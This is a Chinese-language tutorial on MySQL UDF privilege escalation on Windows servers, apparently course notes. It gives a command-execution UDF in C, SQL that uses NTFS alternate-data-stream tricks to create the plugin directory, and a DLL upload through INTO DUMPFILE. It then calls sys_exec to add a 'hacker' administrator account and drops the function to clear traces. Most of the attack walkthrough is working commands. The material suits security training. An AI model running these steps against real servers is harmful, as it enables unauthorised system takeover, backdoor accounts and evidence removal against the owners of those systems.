## 什么是UDF提权

上一节我们介绍了系统提权，本节中我们来看看数据库应用提权。当我们通过Web应用漏洞获得数据库连接权限后，可以利用数据库功能提升服务器权限。

UDF是User Defined Function的缩写，意为用户定义函数。其作用是为用户提供高效创建函数的方式。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_18.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_20.png)

具体方法是编写一个能调用系统命令的UDF DLL文件。DLL是Dynamic Link Library的缩写，即动态链接库。在Windows系统中，DLL存放共享数据和函数，可供多个程序调用。

在Mysql中，我们可以通过自定义函数来执行系统命令。核心思路是创建一个能执行CMD命令的函数。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_22.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_24.png)

**创建UDF函数的代码逻辑**：
```c
// 伪代码示例：创建一个执行系统命令的函数
#include <stdlib.h>
my_bool exec_command_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    // 初始化函数
    return 0;
}
char *exec_command(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error) {
    // 执行系统命令
    system(args->args[0]);
    return result;
}
```

![](img/fb5e8adf94583c861911f9ae77b8f2d7_26.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_28.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_29.png)

在Mysql 5.1及以上版本中，UDF DLL文件需放置在特定目录才能被调用。该目录通常为Mysql安装目录下的`lib/plugin`文件夹。

如果目标服务器不存在该目录，我们需要先创建它。但Mysql的文件操作功能无法直接创建目录，这时需要用到NTFS ADS流技术。

NTFS ADS全称是Alternate Data Stream，即交换数据流。它是NTFS文件系统的特性。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_50.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_52.png)

**ADS流格式**：
```
文件名:流名:流种类
```

![](img/fb5e8adf94583c861911f9ae77b8f2d7_54.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_56.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_57.png)

流名可以省略。常见的流种类是`$DATA`，表示数据流。当流种类为`$INDEX_ALLOCATION`时，表示该数据流对应的是一个文件夹。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_59.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_61.png)

因此，我们可以通过Mysql的`SELECT ... INTO OUTFILE`语句，配合特定的ADS流格式来创建目录。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_63.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_65.png)

1.  创建文件：
    ```sql
    SELECT 'file content' INTO OUTFILE 'C:\\test\\file.txt::$DATA';
    ```
    这会在`C:\test`目录下创建`file.txt`文件，内容为“file content”。

2.  创建目录：
    ```sql
    SELECT '' INTO OUTFILE 'C:\\test\\NewFolder::$INDEX_ALLOCATION';
    ```
    这会在`C:\test`目录下创建名为`NewFolder`的文件夹。

## Mysql UDF提权实战流程

了解了UDF和ADS流的概念后，我们来看具体的提权流程。场景假设：目标主机开启了Mysql远程连接，并且我们已获取数据库的用户名和密码。

以下是核心操作步骤：

1.  **信息收集**
    首先需要确认Mysql版本和安装路径。
    *   查看Mysql版本：
        ```sql
        SELECT version();
        ```
        或通过系统命令（若有权执行）：
        ```bash
        mysql -V
        ```
    *   查找Mysql安装目录：
        ```sql
        SELECT @@basedir;
        ```

2.  **准备UDF DLL文件**
    我们需要一个包含执行命令函数的DLL文件。通常使用现成的`lib_mysqludf_sys.dll`（Windows）或`lib_mysqludf_sys.so`（Linux）。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_108.png)

3.  **创建目录（如果需要）**
    如果`@@basedir/lib/plugin`目录不存在，则使用ADS流创建它。
    ```sql
    -- 创建lib目录
    SELECT '' INTO OUTFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';
    -- 在lib下创建plugin目录
    SELECT '' INTO OUTFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
    ```
    **注意**：路径中的斜杠需要使用反斜杠`\`并转义，或使用正斜杠`/`。

![](img/fb5e8adf94583c861911f9ae77b8f2d7_110.png)

4.  **上传DLL文件**
    将DLL文件内容写入数据库的临时表，再导出到目标目录。
    ```sql
    -- 创建临时表
    CREATE TABLE temp_udf (udf_code LONGBLOB);
    -- 将DLL文件的16进制内容插入表中（此处为示例，内容需替换）
    INSERT INTO temp_udf VALUES (0x4D5A90000300000004000000FFFF0000...);
    -- 将数据导出为DLL文件
    SELECT udf_code FROM temp_udf INTO DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/lib_mysqludf_sys.dll';
    -- 删除临时表
    DROP TABLE temp_udf;
    ```

5.  **创建UDF函数并执行命令**
    DLL文件就位后，即可创建函数并调用。
    ```sql
    -- 创建函数（函数名可能因DLL而异，例如`sys_exec`）
    CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
    -- 使用函数执行系统命令（例如添加用户）
    SELECT sys_exec('net user hacker Password123! /add');
    SELECT sys_exec('net localgroup administrators hacker /add');
    ```

![](img/fb5e8adf94583c861911f9ae77b8f2d7_112.png)

![](img/fb5e8adf94583c861911f9ae77b8f2d7_114.png)

6.  **清理痕迹**
    提权成功后，删除创建的UDF函数。
    ```sql
    DROP FUNCTION sys_exec;
    ```
